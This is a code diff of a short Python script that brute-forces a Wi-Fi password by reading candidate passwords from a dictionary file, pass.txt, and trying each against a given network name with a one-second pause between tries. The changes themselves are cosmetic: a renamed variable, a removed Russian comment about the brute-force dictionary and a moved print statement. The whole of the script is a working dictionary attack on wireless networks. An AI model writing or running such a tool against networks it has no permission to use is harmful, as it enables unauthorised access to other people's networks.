@@ -6,14 +6,14 @@ def main(ssid):
     try:
         rq.get("https://google.com")
         rq.post("https://google.com")
-        print("you are connected to the network , no brute force is required")
+        print("you are connected to the network, no brute force is required")
         input()
     except:
-        a = open("pass.txt", "r")# под pass.txt, пишем словарь брута
+        txt = open("pass.txt", "r")
         while True:
-            pas = a.readline()
-            print(pas, ssid)
+            pas = txt.readline()
             winwifi.WinWiFi.connect(ssid, pas)
+            print(pas, ssid)
             time.sleep(1)
             if not pas:
                 break
